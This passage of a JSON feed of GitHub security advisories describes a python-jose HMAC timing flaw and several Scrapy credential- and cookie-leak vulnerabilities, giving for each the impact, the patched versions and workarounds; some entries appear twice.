            "content_html": "<p>python-jose before 1.3.2 allows attackers to have unspecified impact by leveraging failure to use a constant time comparison for HMAC keys.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-7036\">https://nvd.nist.gov/vuln/detail/CVE-2016-7036</a></li>\n<li><a href=\"https://github.com/mpdavis/python-jose/releases/tag/1.3.2\">https://github.com/mpdavis/python-jose/releases/tag/1.3.2</a></li>\n<li><a href=\"https://web.archive.org/web/20210123221523/http://www.securityfocus.com/bid/95845\">https://web.archive.org/web/20210123221523/http://www.securityfocus.com/bid/95845</a></li>\n<li><a href=\"https://github.com/mpdavis/python-jose/commit/73007d6887a7517ac07c6e755e494baee49ef513\">https://github.com/mpdavis/python-jose/commit/73007d6887a7517ac07c6e755e494baee49ef513</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w799-prg3-cx77\">https://github.com/advisories/GHSA-w799-prg3-cx77</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w799-prg3-cx77",
            "title": "[python-jose] python-jose failure to use a constant time comparison for HMAC keys",
            "date_modified": "2023-11-16T05:04:43.000Z",
            "date_published": "2022-05-17T03:02:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w799-prg3-cx77"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When the <a href=\"https://docs.scrapy.org/en/2.6/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpproxy\">built-in HTTP proxy downloader middleware</a> processes a request with <code>proxy</code> metadata, and that <code>proxy</code> metadata includes proxy credentials, the built-in HTTP proxy downloader middleware sets the <code>Proxy-Authentication</code> header, but only if that header is not already set.</p>\n<p>There are third-party proxy-rotation downloader middlewares that set different <code>proxy</code> metadata every time they process a request.</p>\n<p>Because of request retries and redirects, the same request can be processed by downloader middlewares more than once, including both the built-in HTTP proxy downloader middleware and any third-party proxy-rotation downloader middleware.</p>\n<p>These third-party proxy-rotation downloader middlewares could change the <code>proxy</code> metadata of a request to a new value, but fail to remove the <code>Proxy-Authentication</code> header from the previous value of the <code>proxy</code> metadata, causing the credentials of one proxy to be leaked to a different proxy.</p>\n<p>If you rotate proxies from different proxy providers, and any of those proxies requires credentials, you are affected, unless you are handling proxy rotation as described under <strong>Workarounds</strong> below. If you use a third-party downloader middleware for proxy rotation, the same applies to that downloader middleware, and installing a patched version of Scrapy may not be enough; patching that downloader middlware may be necessary as well.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.6.2.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.2 is not an option, you may upgrade to Scrapy 1.8.3 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, make sure that any code that changes the value of the <code>proxy</code> request meta also removes the <code>Proxy-Authorization</code> header from the request if present.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-9x8m-2xpf-crp3\">https://github.com/scrapy/scrapy/security/advisories/GHSA-9x8m-2xpf-crp3</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f\">https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9x8m-2xpf-crp3\">https://github.com/advisories/GHSA-9x8m-2xpf-crp3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9x8m-2xpf-crp3",
            "title": "[scrapy] Scrapy before 2.6.2 and 1.8.3 vulnerable to one proxy sending credentials to another",
            "date_modified": "2023-11-15T18:31:23.000Z",
            "date_published": "2022-07-29T22:26:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9x8m-2xpf-crp3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When the <a href=\"https://docs.scrapy.org/en/2.6/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpproxy\">built-in HTTP proxy downloader middleware</a> processes a request with <code>proxy</code> metadata, and that <code>proxy</code> metadata includes proxy credentials, the built-in HTTP proxy downloader middleware sets the <code>Proxy-Authentication</code> header, but only if that header is not already set.</p>\n<p>There are third-party proxy-rotation downloader middlewares that set different <code>proxy</code> metadata every time they process a request.</p>\n<p>Because of request retries and redirects, the same request can be processed by downloader middlewares more than once, including both the built-in HTTP proxy downloader middleware and any third-party proxy-rotation downloader middleware.</p>\n<p>These third-party proxy-rotation downloader middlewares could change the <code>proxy</code> metadata of a request to a new value, but fail to remove the <code>Proxy-Authentication</code> header from the previous value of the <code>proxy</code> metadata, causing the credentials of one proxy to be leaked to a different proxy.</p>\n<p>If you rotate proxies from different proxy providers, and any of those proxies requires credentials, you are affected, unless you are handling proxy rotation as described under <strong>Workarounds</strong> below. If you use a third-party downloader middleware for proxy rotation, the same applies to that downloader middleware, and installing a patched version of Scrapy may not be enough; patching that downloader middlware may be necessary as well.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.6.2.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.2 is not an option, you may upgrade to Scrapy 1.8.3 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, make sure that any code that changes the value of the <code>proxy</code> request meta also removes the <code>Proxy-Authorization</code> header from the request if present.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-9x8m-2xpf-crp3\">https://github.com/scrapy/scrapy/security/advisories/GHSA-9x8m-2xpf-crp3</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f\">https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9x8m-2xpf-crp3\">https://github.com/advisories/GHSA-9x8m-2xpf-crp3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9x8m-2xpf-crp3",
            "title": "[scrapy] Scrapy before 2.6.2 and 1.8.3 vulnerable to one proxy sending credentials to another",
            "date_modified": "2023-11-15T18:31:23.000Z",
            "date_published": "2022-07-29T22:26:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9x8m-2xpf-crp3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Responses from domain names whose public domain name suffix contains 1 or more periods (e.g. responses from <code>example.co.uk</code>, given its public domain name suffix is <code>co.uk</code>) are able to set cookies that are included in requests to any other domain sharing the same domain name suffix.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.6.0, which restricts cookies with their domain set to any of those in the <a href=\"https://publicsuffix.org/\">public suffix list</a>.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The only workaround for unpatched versions of Scrapy is to <a href=\"https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED\">disable cookies altogether</a>, or <a href=\"https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains\">limit target domains</a> to a subset that does not include domain names with one of the public domain suffixes affected (those with 1 or more periods).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://publicsuffix.org/\">https://publicsuffix.org/</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96\">https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a\">https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mfjm-vh54-3f96\">https://github.com/advisories/GHSA-mfjm-vh54-3f96</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mfjm-vh54-3f96",
            "title": "[scrapy] Scrapy cookie-setting is not restricted based on the public suffix list",
            "date_modified": "2023-11-15T18:30:38.000Z",
            "date_published": "2022-03-01T22:13:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mfjm-vh54-3f96"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Responses from domain names whose public domain name suffix contains 1 or more periods (e.g. responses from <code>example.co.uk</code>, given its public domain name suffix is <code>co.uk</code>) are able to set cookies that are included in requests to any other domain sharing the same domain name suffix.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.6.0, which restricts cookies with their domain set to any of those in the <a href=\"https://publicsuffix.org/\">public suffix list</a>.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The only workaround for unpatched versions of Scrapy is to <a href=\"https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED\">disable cookies altogether</a>, or <a href=\"https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains\">limit target domains</a> to a subset that does not include domain names with one of the public domain suffixes affected (those with 1 or more periods).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://publicsuffix.org/\">https://publicsuffix.org/</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96\">https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a\">https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mfjm-vh54-3f96\">https://github.com/advisories/GHSA-mfjm-vh54-3f96</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mfjm-vh54-3f96",
            "title": "[scrapy] Scrapy cookie-setting is not restricted based on the public suffix list",
            "date_modified": "2023-11-15T18:30:38.000Z",
            "date_published": "2022-03-01T22:13:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mfjm-vh54-3f96"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>If you manually define cookies on a <a href=\"https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request\"><code>Request</code></a> object, and that <code>Request</code> object gets a redirect response, the new <code>Request</code> object scheduled to follow the redirect keeps those user-defined cookies, regardless of the target domain.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.6.0, which resets cookies when creating <code>Request</code> objects to follow redirects¹, and drops the <code>Cookie</code> header if manually-defined if the redirect target URL domain name does not match the source URL domain name².</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.</p>\n<p>¹ At that point the original, user-set cookies have been processed by the cookie middleware into the global or request-specific cookiejar, with their domain restricted to the domain of the original URL, so when the cookie middleware processes the new (redirect) request it will incorporate those cookies into the new request as long as the domain of the new request matches the domain of the original request.</p>\n<p>² This prevents cookie leaks to unintended domains even if the cookies middleware is not used.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, set your cookies using a list of dictionaries instead of a single dictionary, as described in the <a href=\"https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request\"><code>Request</code> documentation</a>, and set the right domain for each cookie.</p>\n<p>Alternatively, you can <a href=\"https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED\">disable cookies altogether</a>, or <a href=\"https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains\">limit target domains</a> to domains that you trust with all your user-set cookies.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Originally reported at <a href=\"https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585/\">huntr.dev</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8\">https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a\">https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-0577\">https://nvd.nist.gov/vuln/detail/CVE-2022-0577</a></li>\n<li><a href=\"https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585\">https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html\">https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2022-159.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2022-159.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cjvr-mfj7-j4j8\">https://github.com/advisories/GHSA-cjvr-mfj7-j4j8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cjvr-mfj7-j4j8",
            "title": "[scrapy] Incorrect Authorization and Exposure of Sensitive Information to an Unauthorized Actor in scrapy",
            "date_modified": "2023-11-15T18:29:54.000Z",
            "date_published": "2022-03-01T22:12:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cjvr-mfj7-j4j8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>If you manually define cookies on a <a href=\"https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request\"><code>Request</code></a> object, and that <code>Request</code> object gets a redirect response, the new <code>Request</code> object scheduled to follow the redirect keeps those user-defined cookies, regardless of the target domain.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.6.0, which resets cookies when creating <code>Request</code> objects to follow redirects¹, and drops the <code>Cookie</code> header if manually-defined if the redirect target URL domain name does not match the source URL domain name².</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.</p>\n<p>¹ At that point the original, user-set cookies have been processed by the cookie middleware into the global or request-specific cookiejar, with their domain restricted to the domain of the original URL, so when the cookie middleware processes the new (redirect) request it will incorporate those cookies into the new request as long as the domain of the new request matches the domain of the original request.</p>\n<p>² This prevents cookie leaks to unintended domains even if the cookies middleware is not used.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, set your cookies using a list of dictionaries instead of a single dictionary, as described in the <a href=\"https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request\"><code>Request</code> documentation</a>, and set the right domain for each cookie.</p>\n<p>Alternatively, you can <a href=\"https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED\">disable cookies altogether</a>, or <a href=\"https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains\">limit target domains</a> to domains that you trust with all your user-set cookies.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Originally reported at <a href=\"https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585/\">huntr.dev</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8\">https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a\">https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-0577\">https://nvd.nist.gov/vuln/detail/CVE-2022-0577</a></li>\n<li><a href=\"https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585\">https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html\">https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2022-159.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2022-159.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cjvr-mfj7-j4j8\">https://github.com/advisories/GHSA-cjvr-mfj7-j4j8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cjvr-mfj7-j4j8",
            "title": "[scrapy] Incorrect Authorization and Exposure of Sensitive Information to an Unauthorized Actor in scrapy",
            "date_modified": "2023-11-15T18:29:54.000Z",
            "date_published": "2022-03-01T22:12:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cjvr-mfj7-j4j8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>If you use <a href=\"http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth\"><code>HttpAuthMiddleware</code></a> (i.e. the <code>http_user</code> and <code>http_pass</code> spider attributes) for HTTP authentication, all requests will expose your credentials to the request target.</p>\n<p>This includes requests generated by Scrapy components, such as <code>robots.txt</code> requests sent by Scrapy when the <code>ROBOTSTXT_OBEY</code> setting is set to <code>True</code>, or as requests reached through redirects.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.5.1 and use the new <code>http_auth_domain</code> spider attribute to control which domains are allowed to receive the configured HTTP authentication credentials.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.5.1 is not an option, you may upgrade to Scrapy 1.8.1 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, set your HTTP authentication credentials on a per-request basis, using for example the <a href=\"https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header\"><code>w3lib.http.basic_auth_header</code></a> function to convert your credentials into a value that you can assign to the <code>Authorization</code> header of your request, instead of defining your credentials globally using <a href=\"http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth\"><code>HttpAuthMiddleware</code></a>.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-jwqp-28gf-p498\">https://github.com/scrapy/scrapy/security/advisories/GHSA-jwqp-28gf-p498</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/b01d69a1bf48060daec8f751368622352d8b85a6\">https://github.com/scrapy/scrapy/commit/b01d69a1bf48060daec8f751368622352d8b85a6</a></li>\n<li><a href=\"https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header\">https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header</a></li>\n<li><a href=\"http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth\">http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41125\">https://nvd.nist.gov/vuln/detail/CVE-2021-41125</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html\">https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwqp-28gf-p498\">https://github.com/advisories/GHSA-jwqp-28gf-p498</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwqp-28gf-p498",
            "title": "[Scrapy] Scrapy HTTP authentication credentials potentially leaked to target websites ",
            "date_modified": "2023-11-15T18:27:38.000Z",
            "date_published": "2021-10-06T17:46:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwqp-28gf-p498"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}